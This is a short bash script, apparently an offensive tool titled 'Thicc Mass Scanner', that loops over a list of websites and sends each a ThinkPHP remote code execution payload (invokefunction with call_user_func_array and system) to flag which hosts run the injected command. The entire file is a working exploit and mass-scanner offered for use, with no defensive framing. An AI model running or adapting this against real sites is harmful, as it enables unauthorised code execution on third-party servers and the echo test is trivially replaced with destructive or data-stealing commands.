#!/bin/bash
#Thicc Mass Scanner By Adelittle
LISTS=$1

if [[ ! -f ${LISTS} ]]; then
	echo "ERROR: ${LISTS} not found"
	echo "usage: bash $0 list.txt"
	exit
fi

for SITE in $(cat $LISTS);
do
	if [[ $(curl --connect-timeout 3 --max-time 3 -kLs "${SITE}/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%27little%27" ) =~ 'little' ]]; then
		echo "[+] VULN: ${SITE}"
	else
		echo "BAD: ${SITE} not vuln"
	fi
done
